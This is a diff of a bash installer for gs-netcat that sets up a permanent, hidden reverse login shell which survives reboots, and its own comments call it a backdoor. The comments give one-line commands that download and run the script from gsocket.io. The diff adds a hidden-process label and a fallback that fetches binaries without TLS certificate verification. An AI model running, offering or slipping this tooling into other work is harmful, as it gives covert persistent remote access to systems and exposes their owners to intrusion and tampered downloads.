@@ -1,30 +1,34 @@
 #! /usr/bin/env bash
 
-# Install and start a permanent gs-netcat remote login shell
+# Install and start a permanent gs-netcat reverse login shell
+#
+# See https://www.gsocket.io/deploy/ for examples.
 #
 # This script is typically invoked like this as root or non-root user:
-#   $ bash -c"$(curl -fsSL gsocket.io/x)"
+#   $ bash -c "$(curl -fsSL gsocket.io/x)"
 #
+# Connect
+#   $ S=MySecret bash -c "$(curl -fsSL goscket.io/x)""
 # Pre-set a secret:
 #   $ X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
 # Uninstall
 #   $ GS_UNDO=1 bash -c" $(curl -fsSL gsocket.io/x)"
-# Access
-#   $ S=MySecret bash -c "$(curl -fsSL goscket.io/x)""
-#
-#
-# This can be used when:
-# - gs-netcat is _not_ installed
-# - quick way to retain access to any shell (root and non-root)
-#
-# E.g. This command installs and starts a reverse shell:
-# $ bash -c "$(curl -fsSL gsocket.io/x)"
 #
 # Steps taken:
 # 1. Download pre-compiled binary
 # 2. Create a new secret (random)
-# 3. Start gs-netcat as interactive remote login shell
-# 4. Install gs-netcat to start automatically after reboot
+# 3. Start gs-netcat as a interactive reverse login shell and hidden process
+# 4. Install gs-netcat and automatically start after reboot
+#
+# Other variables:
+# GS_DEBUG=1
+# 		- Use binaries from ../packaging/gsnc-deploy-bin/
+#		- Verbose output
+#		- Shorter timeout to restart crontab etc
+# GS_NOINST=1
+#		- Do not install backdoor
+# GS_PREFIX=path
+#		- Use 'path' instead of '/' (needed for packaging/testing)
 
 # Global Defines
 URL_BASE="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/"
@@ -512,12 +516,49 @@ install_user()
 	[[ -z "$IS_SKIPPED" ]] && gs_secret_write "$USER_SEC_FILE" # Create new secret file
 }
 
+ask_nocertcheck()
+{
+	WARN "Can not verify host. CA Bundle is not installed."
+	echo "--> Attempting without certificate verification."
+	echo "--> Press any key to continue or CTRL-C to abort..."
+	echo -en 1>&2 -en "--> Continuing in "
+	local n
+
+	n=10
+	while :; do
+		echo -en 1>&2 "${n}.."
+		n=$((n-1))
+		[[ $n -eq 0 ]] && break 
+		read -t1 -n1 && break
+	done
+	[[ $n -gt 0 ]] || echo 1>&2 "0"
+
+	GS_NOCERTCHECK=1
+}
+
+# Use SSL and if this fails try non-ssl (if user consents to insecure downloads)
+# <nocert-param> <ssl-match> <cmd> <param-url> <url> <param-dst> <dst> 
+dl_ssl()
+{
+	if [[ -z $GS_NOCERTCHECK ]]; then
+		DL_LOG=$("$3" "$4" "$5" "$6" "$7" 2>&1)
+		[[ "${DL_LOG}" != *"$2"* ]] && return
+	fi
+
+	if [[ -z $GS_NOCERTCHECK ]]; then
+		SKIP_OUT
+		ask_nocertcheck
+	fi
+	[[ -z $GS_NOCERTCHECK ]] && return
+
+	echo -en 2>&1 "Downloading binaries without certificate verification................."
+	DL_LOG=$("$3" "$1" "$4" "$5" "$6" "$7" 2>&1)
+}
+
 # Download $1 and save it to $2
 dl()
 {
 	[[ -s "$2" ]] && return
-
-	local dl_log
 
 	# Need to set DL_CMD before GS_DEBUG check for proper error output
 	if command -v curl >/dev/null; then
@@ -539,9 +580,9 @@ dl()
 	fi
 
 	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
-		dl_log=$(curl -fL "${URL_BASE}/${1}" --output "${2}" 2>&1)
+		dl_ssl "-k" "certificate problem" "curl" "-fL" "${URL_BASE}/${1}" "--output" "${2}"
 	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
-		dl_log=$(wget -O "$2" "${URL_BASE}/${1}" 2>&1)
+		dl_ssl "--no-check-certificate" "is not trusted" "wget" "" "${URL_BASE}/${1}" "-O" "${2}"
 	else
 		# errexit "Need curl or wget."
 		FAIL_OUT "CAN NOT HAPPEN"
@@ -549,7 +590,7 @@ dl()
 	fi
 
 	# [[ ! -s "$2" ]] && { errexit "Could not download package."; } 
-	[[ ! -s "$2" ]] && { FAIL_OUT; echo "$dl_log"; exit_code 255; } 
+	[[ ! -s "$2" ]] && { FAIL_OUT; echo "$DL_LOG"; exit_code 255; } 
 }
 
 # S= was set. Do not install but execute in place.
